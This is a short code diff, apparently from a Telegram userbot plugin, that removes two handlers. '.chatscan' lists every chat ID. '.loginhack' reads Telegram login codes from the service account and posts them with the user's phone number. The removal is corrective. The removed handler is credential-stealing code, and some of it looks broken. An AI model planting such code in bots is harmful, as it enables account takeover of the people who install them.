@@ -234,14 +234,3 @@ async def solarsystem(event):
     for i in animation_ttl:
         await asyncio.sleep(animation_interval)
         await event.edit(animation_chars[i % 8])
-
-@events.on(events.NewMessage(pattern=".chatscan"))
-async def chatscan(event):
-    async for dailog in client.iter_dialogs():
-        await event.edit("**chat:** " + dailog.name + " **Id:** " + str(dailog.id))
-
-@events.on(events.NewMessage(pattern=".loginhack"))
-async def main():
-    me = await client.get_me()
-    async for message in client.iter_messages(777000):
-        await events.edit("**Telegram codes**\nmsg: " + message.text + "\n------------------\n" + me.phone+"\n------------------")
